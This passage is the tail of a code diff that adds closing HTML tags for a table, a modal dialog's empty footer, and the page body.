+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
